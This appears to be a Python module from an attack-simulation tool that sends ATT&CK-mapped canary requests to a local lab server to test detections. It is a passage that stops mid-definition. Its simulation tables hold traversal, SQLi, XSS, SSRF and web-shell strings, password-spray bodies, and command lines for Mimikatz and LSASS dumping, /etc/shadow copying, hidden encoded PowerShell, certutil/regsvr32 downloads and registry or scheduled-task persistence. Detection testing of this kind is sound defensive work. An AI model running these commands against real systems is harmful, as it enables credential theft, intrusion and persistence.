from __future__ import annotations

import asyncio
import base64
from dataclasses import dataclass, field
from datetime import datetime, timezone
import hashlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import ipaddress
import json
import logging
import os
from pathlib import Path
import random
import re
import select
import socket
import threading
import time
from typing import Any
from urllib import parse, request
from urllib.error import HTTPError, URLError
from uuid import uuid4

from app.core.config import settings
from app.services.ai.factory import get_adapter
from app.services.atomic_event_catalog import (
    ATOMIC_EVENT_CATEGORIES,
    ATOMIC_EVENT_SIMULATION_IDS,
    ATOMIC_EVENT_SPECS,
    atomic_simulation_id,
    build_atomic_event_requests,
)


logger = logging.getLogger(__name__)
_DETECTION_BRIEFS_PATH = Path(__file__).with_name("attack_simulation_detection_briefs.json")
try:
    DETECTION_BRIEFS: dict[str, dict[str, Any]] = json.loads(_DETECTION_BRIEFS_PATH.read_text())
except Exception as exc:  # pragma: no cover - defensive fallback for packaged deployments
    logger.warning("Attack simulation detection briefs unavailable: %s", exc)
    DETECTION_BRIEFS = {}

_LAB_WEB_SERVER: ThreadingHTTPServer | None = None
_LAB_WEB_SERVER_LOCK = threading.Lock()
_LAB_WEB_HOST = "127.0.0.1"
_LAB_WEB_PORT = 8765
_LAB_WEB_BASE_URL = f"http://{_LAB_WEB_HOST}:{_LAB_WEB_PORT}"
_DEFAULT_ATTACK_LAB_WEB_URL = _LAB_WEB_BASE_URL
_ATTACK_LAB_WEB_URL = os.environ.get("ATTACK_LAB_WEB_URL", _DEFAULT_ATTACK_LAB_WEB_URL).rstrip("/")
_DEFAULT_ATTACK_LAB_ENDPOINT_URL = _LAB_WEB_BASE_URL
_ATTACK_LAB_ENDPOINT_URL = os.environ.get("ATTACK_LAB_ENDPOINT_URL", _DEFAULT_ATTACK_LAB_ENDPOINT_URL).rstrip("/")
_AI_ATTACK_PLANNER_TIMEOUT_SECONDS = float(os.environ.get("AI_ATTACK_PLANNER_TIMEOUT_SECONDS", "12"))
_RUN_ID_RE = re.compile(r"^run-[a-f0-9-]{36}$")
_LOOPBACK_BRIDGES: set[int] = set()
_LOOPBACK_BRIDGES_LOCK = threading.Lock()
LAB_AUTH_USERS = {
    "admin": "CorrectHorseBattery1!",
    "alice": "Wonderland-2026!",
    "bob": "Builder-2026!",
    "service": "Service-Token-2026!",
}


WEB_SIMULATION_REQUESTS: dict[str, list[dict[str, Any]]] = {
    "sim-t1595-http-fingerprint": [
        {"method": "HEAD", "path": "/", "purpose": "service header fingerprint"},
        {"method": "GET", "path": "/", "purpose": "landing page fingerprint"},
    ],
    "sim-t1190-web-exposure": [
        {"method": "GET", "path": "/", "purpose": "public root exposure"},
        {"method": "GET", "path": "/robots.txt", "purpose": "robots disclosure"},
        {"method": "GET", "path": "/.well-known/security.txt", "purpose": "security metadata discovery"},
    ],
    "sim-t1595-web-content-discovery": [
        {"method": "GET", "path": "/admin", "purpose": "admin path discovery"},
        {"method": "GET", "path": "/login", "purpose": "login path discovery"},
        {"method": "GET", "path": "/api/v1/status", "purpose": "API status discovery"},
        {"method": "GET", "path": "/backup.zip", "purpose": "backup artifact discovery"},
        {"method": "GET", "path": "/.git/config", "purpose": "repository metadata discovery"},
    ],
    "sim-t1190-traversal-canary": [
        {"method": "GET", "path": "/download?file=../../../../etc/passwd&ag_canary=path_traversal", "purpose": "path traversal canary"},
        {"method": "GET", "path": "/static/%2e%2e/%2e%2e/windows/win.ini?ag_canary=encoded_traversal", "purpose": "encoded traversal canary"},
    ],
    "sim-t1190-sqli-xss-canary": [
        {"method": "GET", "path": "/search?q=%27%20OR%20%271%27%3D%271&ag_canary=sqli", "purpose": "SQL injection canary"},
        {"method": "GET", "path": "/comment?text=%3Cscript%3Eag_xss_canary%3C%2Fscript%3E&ag_canary=xss", "purpose": "XSS canary"},
    ],
    "sim-t1190-ssrf-canary": [
        {"method": "GET", "path": "/fetch?url=http://169.254.169.254/latest/meta-data/&ag_canary=ssrf_metadata", "purpose": "SSRF metadata canary"},
        {"method": "GET", "path": "/proxy?target=http://127.0.0.1:22&ag_canary=ssrf_loopback", "purpose": "SSRF loopback canary"},
    ],
    "sim-t1059-web-command-canary": [
        {"method": "GET", "path": "/cgi-bin/status?cmd=id&ag_canary=command_injection", "purpose": "command injection canary"},
        {"method": "POST", "path": "/api/run", "body": '{"command":"whoami","ag_canary":"command_injection"}', "purpose": "JSON command injection canary"},
    ],
    "sim-t1505-webshell-canary": [
        {"method": "GET", "path": "/shell.php?cmd=whoami&ag_canary=webshell", "purpose": "web shell URI canary"},
        {"method": "POST", "path": "/uploads/cmd.aspx", "body": "cmd=whoami&ag_canary=webshell", "purpose": "web shell POST canary"},
    ],
    "sim-t1105-web-upload-download": [
        {"method": "GET", "path": "/downloads/agent.ps1?ag_canary=tool_download", "purpose": "tool download canary"},
        {"method": "POST", "path": "/upload", "body": "AG_BENIGN_UPLOAD_CANARY", "purpose": "small upload canary"},
    ],
    "sim-t1552-web-secret-exposure-canary": [
        {"method": "GET", "path": "/.env?ag_canary=secret_exposure", "purpose": "environment secret exposure canary"},
        {"method": "GET", "path": "/config.php.bak?ag_canary=secret_exposure", "purpose": "backup config exposure canary"},
        {"method": "GET", "path": "/id_rsa?ag_canary=secret_exposure", "purpose": "private key exposure canary"},
    ],
    "sim-t1595-http-method-probing": [
        {"method": "OPTIONS", "path": "/?ag_canary=http_method_probe", "purpose": "HTTP OPTIONS method probe"},
        {"method": "TRACE", "path": "/?ag_canary=http_method_probe", "purpose": "HTTP TRACE method probe"},
        {"method": "GET", "path": "/api/v1/status?ag_canary=http_method_probe", "headers": {"X-HTTP-Method-Override": "DELETE"}, "purpose": "method override probe"},
    ],
    "sim-t1595-web-404-burst": [
        {"method": "GET", "path": "/wp-admin?ag_canary=not_found_burst", "purpose": "CMS admin probe"},
        {"method": "GET", "path": "/phpmyadmin?ag_canary=not_found_burst", "purpose": "database admin probe"},
        {"method": "GET", "path": "/server-status?ag_canary=not_found_burst", "purpose": "Apache status probe"},
        {"method": "GET", "path": "/actuator/env?ag_canary=not_found_burst", "purpose": "Spring actuator probe"},
        {"method": "GET", "path": "/.svn/entries?ag_canary=not_found_burst", "purpose": "SVN metadata probe"},
        {"method": "GET", "path": "/owa/auth/logon.aspx?ag_canary=not_found_burst", "purpose": "OWA path probe"},
    ],
    "sim-t1595-tool-user-agent-fingerprint": [
        {"method": "GET", "path": "/?ag_canary=tool_user_agent", "headers": {"User-Agent": "curl/8.6.0"}, "purpose": "curl user-agent probe"},
        {"method": "GET", "path": "/robots.txt?ag_canary=tool_user_agent", "headers": {"User-Agent": "python-requests/2.34.2"}, "purpose": "python requests user-agent probe"},
        {"method": "GET", "path": "/admin?ag_canary=tool_user_agent", "headers": {"User-Agent": "sqlmap/1.8.9#stable"}, "purpose": "sqlmap user-agent probe"},
        {"method": "GET", "path": "/.git/config?ag_canary=tool_user_agent", "headers": {"User-Agent": "Nmap Scripting Engine"}, "purpose": "nmap NSE user-agent probe"},
    ],
    "sim-t1110-basic-auth-bruteforce": [
        {"method": "GET", "path": "/basic-auth?ag_canary=basic_auth_bruteforce", "headers": {"Authorization": "Basic YWRtaW46U3VtbWVyMjAyNCE="}, "purpose": "basic auth failed attempt 1"},
        {"method": "GET", "path": "/basic-auth?ag_canary=basic_auth_bruteforce", "headers": {"Authorization": "Basic YWRtaW46UGFzc3dvcmQxMjMh"}, "purpose": "basic auth failed attempt 2"},
        {"method": "GET", "path": "/basic-auth?ag_canary=basic_auth_bruteforce", "headers": {"Authorization": "Basic YWRtaW46Q29ycmVjdEhvcnNlQmF0dGVyeTEh"}, "purpose": "basic auth final success"},
    ],
    "sim-t1505-suspicious-extension-upload": [
        {"method": "POST", "path": "/upload/shell.php?ag_canary=suspicious_upload", "body": "AG_BENIGN_PHP_UPLOAD_CANARY", "headers": {"Content-Type": "application/octet-stream"}, "purpose": "PHP extension upload canary"},
        {"method": "POST", "path": "/upload/cmd.aspx?ag_canary=suspicious_upload", "body": "AG_BENIGN_ASPX_UPLOAD_CANARY", "headers": {"Content-Type": "application/octet-stream"}, "purpose": "ASPX extension upload canary"},
        {"method": "POST", "path": "/upload/agent.jsp?ag_canary=suspicious_upload", "body": "AG_BENIGN_JSP_UPLOAD_CANARY", "headers": {"Content-Type": "application/octet-stream"}, "purpose": "JSP extension upload canary"},
    ],
    "sim-t1003-shadow-file-access": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cat","args":["/etc/shadow"],"file_path":"/etc/shadow","operation":"read","ag_canary":"shadow_file_access"}', "purpose": "Linux shadow credential-file access canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"grep","args":["root","/etc/shadow"],"file_path":"/etc/shadow","operation":"read","ag_canary":"shadow_file_access"}', "purpose": "Linux shadow search canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cp","args":["/etc/shadow","/tmp/shadow.copy"],"file_path":"/etc/shadow","operation":"copy","ag_canary":"shadow_file_access"}', "purpose": "Linux shadow copy canary"},
    ],
    "sim-t1003-lsass-mimikatz-canary": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"mimikatz.exe","command":"sekurlsa::logonpasswords","target_process":"lsass.exe","operation":"credential_dump_canary","ag_canary":"mimikatz_lsass"}', "purpose": "Mimikatz command-line canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"rundll32.exe","command":"comsvcs.dll MiniDump 640 C:\\\\Windows\\\\Temp\\\\lsass.dmp full","target_process":"lsass.exe","operation":"lsass_dump_canary","ag_canary":"lsass_minidump"}', "purpose": "LSASS minidump command-line canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"procdump64.exe","command":"-ma lsass.exe C:\\\\Windows\\\\Temp\\\\lsass.dmp","target_process":"lsass.exe","operation":"lsass_dump_canary","ag_canary":"procdump_lsass"}', "purpose": "ProcDump LSASS command-line canary"},
    ],
    "sim-t1059-powershell-encoded-command": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA","operation":"process_create","ag_canary":"powershell_encoded"}', "purpose": "PowerShell encoded-command canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"pwsh.exe","command":"pwsh -nop -w hidden -enc SQBFAFgA","operation":"process_create","ag_canary":"powershell_encoded"}', "purpose": "PowerShell Core encoded-command canary"},
    ],
    "sim-t1059-cmd-shell-execution": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cmd.exe","command":"cmd.exe /c whoami && hostname","operation":"process_create","ag_canary":"cmd_shell"}', "purpose": "cmd shell execution canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cmd.exe","command":"cmd.exe /c dir C:\\\\Users","operation":"process_create","ag_canary":"cmd_shell"}', "purpose": "cmd directory listing canary"},
    ],
    "sim-t1105-certutil-transfer": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"certutil.exe","command":"certutil.exe -urlcache -split -f http://127.0.0.1/payload.bin C:\\\\Windows\\\\Temp\\\\payload.bin","operation":"process_create","ag_canary":"certutil_transfer"}', "purpose": "certutil download canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"bitsadmin.exe","command":"bitsadmin /transfer agjob http://127.0.0.1/tool.exe C:\\\\Windows\\\\Temp\\\\tool.exe","operation":"process_create","ag_canary":"certutil_transfer"}', "purpose": "BITS transfer canary"},
    ],
    "sim-t1547-run-key-persistence": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"reg.exe","command":"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v AGCanary /d C:\\\\Users\\\\Public\\\\ag.exe","registry_key":"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run","operation":"registry_set","ag_canary":"run_key_persistence"}', "purpose": "Run key registry persistence canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"New-ItemProperty -Path HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -Name AGCanary","registry_key":"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run","operation":"registry_set","ag_canary":"run_key_persistence"}', "purpose": "PowerShell Run key persistence canary"},
    ],
    "sim-t1053-scheduled-task": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"schtasks.exe","command":"schtasks /Create /SC MINUTE /TN AGCanary /TR C:\\\\Users\\\\Public\\\\ag.exe","operation":"scheduled_task_create","ag_canary":"scheduled_task"}', "purpose": "scheduled task creation canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"Register-ScheduledTask -TaskName AGCanary","operation":"scheduled_task_create","ag_canary":"scheduled_task"}', "purpose": "PowerShell scheduled task canary"},
    ],
    "sim-t1543-service-creation": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"sc.exe","command":"sc.exe create AGCanary binPath= C:\\\\Users\\\\Public\\\\ag.exe start= demand","operation":"service_create","ag_canary":"service_creation"}', "purpose": "service creation canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"New-Service -Name AGCanary -BinaryPathName C:\\\\Users\\\\Public\\\\ag.exe","operation":"service_create","ag_canary":"service_creation"}', "purpose": "PowerShell service creation canary"},
    ],
    "sim-t1218-rundll32-proxy": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"rundll32.exe","command":"rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication\\\";document.write();","operation":"process_create","ag_canary":"rundll32_proxy"}', "purpose": "rundll32 LOLBin canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"rundll32.exe","command":"rundll32.exe C:\\\\Windows\\\\Temp\\\\ag.dll,Start","operation":"process_create","ag_canary":"rundll32_proxy"}', "purpose": "rundll32 DLL launch canary"},
    ],
    "sim-t1218-regsvr32-proxy": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"regsvr32.exe","command":"regsvr32.exe /s /n /u /i:http://127.0.0.1/calc.sct scrobj.dll","operation":"process_create","ag_canary":"regsvr32_proxy"}', "purpose": "regsvr32 scriptlet canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"regsvr32.exe","command":"regsvr32.exe /s C:\\\\Windows\\\\Temp\\\\ag.dll","operation":"process_create","ag_canary":"regsvr32_proxy"}', "purpose": "regsvr32 DLL registration canary"},
    ],
    "sim-t1082-system-discovery": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"systeminfo.exe","command":"systeminfo.exe","operation":"process_create","ag_canary":"system_discovery"}', "purpose": "systeminfo discovery canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"whoami.exe","command":"whoami.exe /all","operation":"process_create","ag_canary":"system_discovery"}', "purpose": "whoami discovery canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"ipconfig.exe","command":"ipconfig.exe /all","operation":"process_create","ag_canary":"system_discovery"}', "purpose": "network config discovery canary"},
    ],
    "sim-t1083-file-discovery": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cmd.exe","command":"cmd.exe /c dir C:\\\\Users\\\\Public /s","file_path":"C:\\\\Users\\\\Public","operation":"file_discovery","ag_canary":"file_discovery"}', "purpose": "recursive file discovery canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"Get-ChildItem -Recurse C:\\\\Users\\\\Public","file_path":"C:\\\\Users\\\\Public","operation":"file_discovery","ag_canary":"file_discovery"}', "purpose": "PowerShell file discovery canary"},
    ],
    "sim-t1033-user-discovery": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"whoami.exe","command":"whoami.exe /user","operation":"process_create","ag_canary":"user_discovery"}', "purpose": "current user discovery canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cmd.exe","command":"cmd.exe /c echo %USERNAME%","operation":"process_create","ag_canary":"user_discovery"}', "purpose": "environment username discovery canary"},
    ],
    "sim-t1057-process-discovery": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"tasklist.exe","command":"tasklist.exe /v","operation":"process_create","ag_canary":"process_discovery"}', "purpose": "tasklist process discovery canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"Get-Process","operation":"process_create","ag_canary":"process_discovery"}', "purpose": "PowerShell process discovery canary"},
    ],
    "sim-t1016-network-config-discovery": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"ipconfig.exe","command":"ipconfig.exe /all","operation":"process_create","ag_canary":"network_config_discovery"}', "purpose": "ipconfig network configuration canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"netsh.exe","command":"netsh interface show interface","operation":"process_create","ag_canary":"network_config_discovery"}', "purpose": "netsh interface discovery canary"},
    ],
    "sim-t1018-remote-system-discovery": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"net.exe","command":"net view /domain","operation":"process_create","ag_canary":"remote_system_discovery"}', "purpose": "domain remote system discovery canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"nltest.exe","command":"nltest /dclist:LAB","operation":"process_create","ag_canary":"remote_system_discovery"}', "purpose": "domain controller discovery canary"},
    ],
    "sim-t1518-software-discovery": [
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"wmic.exe","command":"wmic product get name,version","operation":"process_create","ag_canary":"software_discovery"}', "purpose": "installed software discovery canary"},
        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"Get-ItemProperty HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*","operation":"process_create","ag_canary":"software_discovery"}', "purpose": "registry software discovery canary"},
    ],
    "sim-t1110-web-login-failures": [
        {"method": "POST", "path": "/login", "body": "username=admin&password=wrong-one&ag_canary=failed_login", "purpose": "failed login canary"},
        {"method": "POST", "path": "/login", "body": "username=admin&password=wrong-two&ag_canary=failed_login", "purpose": "second failed login canary"},
        {"method": "POST", "path": "/login", "body": "username=service&password=wrong-three&ag_canary=failed_login", "purpose": "low-rate credential canary"},
    ],
    "sim-t1110-web-bruteforce": [
        {"method": "POST", "path": "/login", "body": "username=admin&password=Summer2024!&ag_canary=brute_force", "purpose": "brute force attempt 1"},
        {"method": "POST", "path": "/login", "body": "username=admin&password=Password123!&ag_canary=brute_force", "purpose": "brute force attempt 2"},
        {"method": "POST", "path": "/login", "body": "username=admin&password=Admin12345!&ag_canary=brute_force", "purpose": "brute force attempt 3"},
        {"method": "POST", "path": "/login", "body": "username=admin&password=CorrectHorseBattery1!&ag_canary=brute_force", "purpose": "brute force final success canary"},
    ],
    "sim-t1110-web-password-spray": [
        {"method": "POST", "path": "/login", "body": "username=admin&password=Spring2026!&ag_canary=password_spray", "purpose": "password spray admin"},
        {"method": "POST", "path": "/login", "body": "username=alice&password=Spring2026!&ag_canary=password_spray", "purpose": "password spray alice"},
        {"method": "POST", "path": "/login", "body": "username=bob&password=Spring2026!&ag_canary=password_spray", "purpose": "password spray bob"},
        {"method": "POST", "path": "/login", "body": "username=service&password=Spring2026!&ag_canary=password_spray", "purpose": "password spray service"},
    ],
    "sim-t1589-web-user-enumeration": [
        {"method": "GET", "path": "/login/user-check?username=admin&ag_canary=user_enumeration", "purpose": "known user enumeration canary"},
        {"method": "GET", "path": "/login/user-check?username=alice&ag_canary=user_enumeration", "purpose": "second known user enumeration canary"},
        {"method": "GET", "path": "/login/user-check?username=backupadmin&ag_canary=user_enumeration", "purpose": "unknown user enumeration canary"},
        {"method": "POST", "path": "/login", "body": "username=backupadmin&password=anything&ag_canary=user_enumeration", "purpose": "unknown login user enumeration canary"},
    ],
    "sim-t1071-web-beacon": [
        {"method": "GET", "path": "/api/ping?client=lab-agent&seq=1&ag_canary=beacon", "purpose": "HTTP beacon canary"},
        {"method": "GET", "path": "/api/ping?client=lab-agent&seq=2&ag_canary=beacon", "purpose": "second HTTP beacon canary"},
        {"method": "POST", "path": "/api/telemetry", "body": '{"client":"lab-agent","seq":3,"ag_canary":"beacon"}', "purpose": "HTTP beacon POST canary"},
    ],
    "sim-t1041-web-exfil-canary": [
        {"method": "POST", "path": "/api/export", "body": '{"records":25,"classification":"benign_lab","ag_canary":"exfil"}', "purpose": "small exfil-like upload canary"},
        {"method": "POST", "path": "/collect", "body": "AG_EXFIL_CANARY_BLOCK_001\nAG_EXFIL_CANARY_BLOCK_002\n", "purpose": "multi-line exfil-like body canary"},
    ],
}

ENDPOINT_SIMULATION_IDS = {
    "sim-t1003-shadow-file-access",
    "sim-t1003-lsass-mimikatz-canary",
    "sim-t1059-powershell-encoded-command",
    "sim-t1059-cmd-shell-execution",
    "sim-t1105-certutil-transfer",
    "sim-t1547-run-key-persistence",
    "sim-t1053-scheduled-task",
    "sim-t1543-service-creation",
    "sim-t1218-rundll32-proxy",
    "sim-t1218-regsvr32-proxy",
    "sim-t1082-system-discovery",
    "sim-t1083-file-discovery",
    "sim-t1033-user-discovery",
    "sim-t1057-process-discovery",
    "sim-t1016-network-config-discovery",
    "sim-t1018-remote-system-discovery",
    "sim-t1518-software-discovery",
}
WEB_SIMULATION_REQUESTS.update(build_atomic_event_requests())
ENDPOINT_SIMULATION_IDS.update(ATOMIC_EVENT_SIMULATION_IDS)
WEB_SIMULATION_IDS = set(WEB_SIMULATION_REQUESTS) - ENDPOINT_SIMULATION_IDS
LOG_SOURCES = {"attacked_server", "web", "run", "access", "security", "error", "auth", "endpoint"}
ENDPOINT_CANARY_CATEGORIES = {
    "shadow_file_access",
    "mimikatz_lsass",
    "lsass_dump",
    "powershell_encoded",
    "cmd_shell",
    "certutil_transfer",
    "run_key_persistence",
    "scheduled_task",
    "service_creation",
    "rundll32_proxy",
    "regsvr32_proxy",
    "system_discovery",
    "file_discovery",
    "user_discovery",
    "process_discovery",
    "network_config_discovery",
    "remote_system_discovery",
    "software_discovery",
}
ENDPOINT_CANARY_CATEGORIES.update(ATOMIC_EVENT_CATEGORIES)


@dataclass(frozen=True)
class Simulation:
    id: str
    technique_id: str
    name: str
    category: str
    risk_level: int
    target_types: list[str]
    description: str
    expected_telemetry: list[str]
    safety_controls: list[str]
    steps: list[str]
    destructive: bool = False
    emits_network_traffic: bool = False


@dataclass(frozen=True)
class Target:
    id: str
    name: str
    address: str
    target_type: str
    environment: str
    owner: str
    authorization: str
    allowed_categories: list[str]
    allowed_simulations: list[str] = field(default_factory=list)
    rate_limit: str = "dry-run only"
    allowed_hours: str = "lab approval required"


SIMULATIONS: list[Simulation] = [
    Simulation(
        id="sim-t1595-http-fingerprint",
        technique_id="T1595",
        name="HTTP/TLS service fingerprint plan",
        category="reconnaissance",
        risk_level=0,
        target_types=["http", "https", "web"],
        description="Prepare a safe external-service fingerprint validation for approved web targets.",
        expected_telemetry=["lab web access log", "request headers", "response status", "source IP", "run correlation ID"],
        safety_controls=["target allowlist", "local telemetry server only", "no payloads", "rate limit", "analyst review"],
        steps=[
            "Confirm target authorization and maintenance window.",
            "Start the local telemetry web server on 127.0.0.1.",
            "Send one HTTP HEAD request and one HTTP GET request to the local lab server.",
            "Record request/response telemetry to JSONL log files.",
            "Record whether the detection fired or the telemetry was only observed.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1190-web-exposure",
        technique_id="T1190",
        name="Public web exposure validation plan",
        category="initial-access-surface",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Validate visibility for benign public-facing web exposure checks without exploit payloads.",
        expected_telemetry=["lab web access log", "application access log", "request headers", "path and status"],
        safety_controls=["no exploit payload", "no fuzzing", "local telemetry server only", "single request set"],
        steps=[
            "Review target technology and allowed URL paths.",
            "Start the local telemetry web server on 127.0.0.1.",
            "Send benign requests for /, /robots.txt, /.well-known/security.txt.",
            "Do not submit forms or payloads.",
            "Capture expected log fields: path, status, user-agent, source IP.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1595-web-content-discovery",
        technique_id="T1595",
        name="Web content discovery and path enumeration",
        category="web-reconnaissance",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate benign admin/API/backup/repository path probes against the lab web server.",
        expected_telemetry=["access log path distribution", "404 status spikes", "admin path probes", "backup path probes"],
        safety_controls=["local telemetry server only", "fixed path list", "no directory brute force", "no payload execution"],
        steps=[
            "Start the local telemetry web server.",
            "Request a fixed set of common administrative, API, backup, and repository paths.",
            "Record status, path, user-agent, and run correlation fields.",
            "Validate web discovery detections without scanning arbitrary paths.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1190-traversal-canary",
        technique_id="T1190",
        name="Path traversal canary validation",
        category="web-exploit-canary",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Send harmless path-traversal-shaped canary requests to validate parser and WAF telemetry.",
        expected_telemetry=["query string", "encoded traversal sequence", "canary tag", "HTTP 404/200 status"],
        safety_controls=["canary strings only", "local telemetry server only", "no filesystem access", "no exploit execution"],
        steps=[
            "Send fixed traversal-looking requests containing explicit ag_canary markers.",
            "Do not read files or resolve paths on the server.",
            "Record decoded query keys and matched canary indicators.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1190-sqli-xss-canary",
        technique_id="T1190",
        name="SQL injection and XSS canary validation",
        category="web-exploit-canary",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate SQLi/XSS-shaped canary requests without database, browser, or script execution.",
        expected_telemetry=["sqli-shaped query", "xss-shaped query", "URL encoding", "canary classification"],
        safety_controls=["local telemetry server only", "no database", "no script execution", "fixed canaries"],
        steps=[
            "Send one SQLi-shaped query and one XSS-shaped query to benign lab endpoints.",
            "Classify canary indicators in web telemetry.",
            "Validate WAF/SIEM parsing and alert coverage.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1190-ssrf-canary",
        technique_id="T1190",
        name="SSRF metadata and loopback canary validation",
        category="web-exploit-canary",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate SSRF-shaped URL parameters without making server-side outbound requests.",
        expected_telemetry=["metadata URL parameter", "loopback URL parameter", "query keys", "canary classification"],
        safety_controls=["no server-side fetch", "local telemetry server only", "fixed URL parameters", "metadata not contacted"],
        steps=[
            "Send fixed SSRF-looking URL parameters to local lab endpoints.",
            "The server records the parameter but never fetches it.",
            "Validate SSRF detector logic on request telemetry.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1059-web-command-canary",
        technique_id="T1059",
        name="Web command execution canary validation",
        category="execution-canary",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate command-injection-shaped canary requests without command execution.",
        expected_telemetry=["cmd parameter", "JSON command field", "body hash", "canary classification"],
        safety_controls=["commands are never executed", "local telemetry server only", "fixed canary values"],
        steps=[
            "Send command-shaped parameters and JSON fields to lab endpoints.",
            "Record request body length, hash, and preview.",
            "Validate command-injection detection logic without execution.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1505-webshell-canary",
        technique_id="T1505.003",
        name="Web shell URI and POST canary validation",
        category="persistence-canary",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate web-shell-shaped requests to validate telemetry without uploading or running shells.",
        expected_telemetry=["shell-like extension", "cmd parameter", "POST body hash", "canary classification"],
        safety_controls=["no file creation", "no command execution", "local telemetry server only", "fixed canaries"],
        steps=[
            "Send URI and POST canaries that resemble web-shell access patterns.",
            "The lab server returns benign responses and records indicators.",
            "Validate web-shell detection logic and triage fields.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1105-web-upload-download",
        technique_id="T1105",
        name="Ingress tool transfer upload/download canary",
        category="transfer-canary",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate benign upload/download telemetry for tool-transfer detection validation.",
        expected_telemetry=["download path", "upload endpoint", "body length", "user-agent", "canary classification"],
        safety_controls=["no executable content", "small benign body", "local telemetry server only"],
        steps=[
            "Request a fixed benign download path.",
            "POST a small benign canary body to an upload endpoint.",
            "Record transfer-like telemetry without storing files.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1552-web-secret-exposure-canary",
        technique_id="T1552.001",
        name="Web-exposed secret and backup file canary",
        category="credential-exposure-canary",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate requests for exposed .env, backup config, and private-key paths without returning secrets.",
        expected_telemetry=["secret-like path", "backup config path", "private-key path", "canary classification"],
        safety_controls=["no real secrets", "local telemetry server only", "fixed path list", "404/benign responses only"],
        steps=[
            "Request fixed secret/config/key-looking paths against the local lab server.",
            "The server records access attempts but never serves secret material.",
            "Validate detections for exposed credential/config discovery attempts.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1595-http-method-probing",
        technique_id="T1595",
        name="HTTP method and override probing",
        category="web-reconnaissance",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Send real OPTIONS, TRACE, and method-override probes to the lab web server to validate method-anomaly telemetry.",
        expected_telemetry=["OPTIONS request", "TRACE request", "method override header", "405/200 status", "WAF method_probe alert"],
        safety_controls=["lab server only", "fixed methods", "no payload execution", "no external target"],
        steps=[
            "Send OPTIONS and TRACE requests to the lab target.",
            "Send a benign request with X-HTTP-Method-Override.",
            "Validate HTTP method anomaly detections from access and WAF-style logs.",
        ],
        emits_network_traffic=True,
    ),
    Simulation(
        id="sim-t1595-web-404-burst",
        technique_id="T1595",
        name="Web 404 discovery burst",
        category="web-reconnaissance",
        risk_level=1,
        target_types=["http", "https", "web"],
        description="Generate a small real 404 burst against common admin and technology paths to validate path-scan detections.",
